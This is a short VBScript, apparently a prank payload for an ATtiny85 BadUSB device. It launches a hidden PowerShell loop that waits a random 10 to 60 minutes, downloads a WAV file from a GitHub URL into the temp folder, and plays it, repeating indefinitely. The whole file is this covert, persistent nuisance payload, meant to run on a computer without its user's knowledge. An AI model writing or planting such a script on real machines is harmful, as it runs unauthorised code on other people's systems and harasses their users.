command = " " & _
          " $URL = \"https://raw.githubusercontent.com/msr8/attiny85/main/Assets/yamete-kudasai.wav\" " & _
          " $FP  = \"$env:TEMP\15791817.wav\" " & _
          " $MINTIME = 600  # 10 minutes " & _
          " $MAXTIME = 3600 # 1 hour " & _
          " " & _
          " while ($true) { " & _
          "     $waitTime = Get-Random -Minimum $MINTIME -Maximum $MAXTIME " & _
          "     Start-Sleep -Seconds $waitTime " & _
          "     if (!(Test-Path $FP)) { " & _
          "         Invoke-WebRequest $URL -OutFile $FP " & _
          "     } " & _
          "     (New-Object System.Media.SoundPlayer($FP)).PlaySync() " & _
          " } "

Set objShell = CreateObject("Wscript.shell")
objShell.run("powershell.exe  -command " & command)